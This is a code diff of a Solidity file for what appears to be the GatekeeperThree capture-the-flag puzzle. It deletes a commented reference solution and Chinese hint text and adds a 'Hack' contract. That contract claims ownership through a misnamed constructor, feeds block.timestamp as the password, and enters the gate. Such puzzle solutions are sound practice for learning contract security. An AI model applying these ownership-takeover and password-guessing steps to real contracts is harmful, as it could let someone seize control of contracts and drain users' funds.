@@ -24,11 +24,9 @@ contract SimpleTrick {
     
   function trickyTrick() public {
     if (address(this) == msg.sender && address(this) != trick) {
-      
       target.getAllowance(password);
     }
   }
-  
 }
 
 contract GatekeeperThree {
@@ -77,37 +75,17 @@ contract GatekeeperThree {
   receive () external payable {}
 }
 
+contract Hack{
 
-//应付大门，成为入门者。 
- 
-//可能有帮助的事情: 召回低级函数的返回值。 注意语义。 刷新以太坊中的存储工作方式。
+  
+  function attack(GatekeeperThree _add)public{
+    _add.construct0r();
+    _add.createTrick();
+    _add.getAllowance(block.timestamp);
+    _add.enter();
 
-
-
-
-
-
-contract GatekeeperThreeSolution {
-    constructor() payable {}
-
-    function solve(address _gatekeeper) external {
-        GatekeeperThree gatekeeper = GatekeeperThree(_gatekeeper);
-
-        // Solve gateOne
-        gatekeeper.construct0r(); // Sets owner to this contract
-
-        // Solve gateTwo
-        gatekeeper.createTrick();
-        gatekeeper.getAllowance(block.timestamp); // Sets allow_enterance to true
-
-        // Solve gateThree
-        // Forwards this contract's balance to gatekeeper. Must be at least 0.001 ETH
-        (bool success, ) = payable(address(gatekeeper)).call{
-            value: address(this).balance
-        }("");
-        require(success, "Transfer failed.");
-
-        // Completes the problem
-        gatekeeper.enter();
-    }
+  }
+  receive()external payable{
+    require(false);
+  }
 }
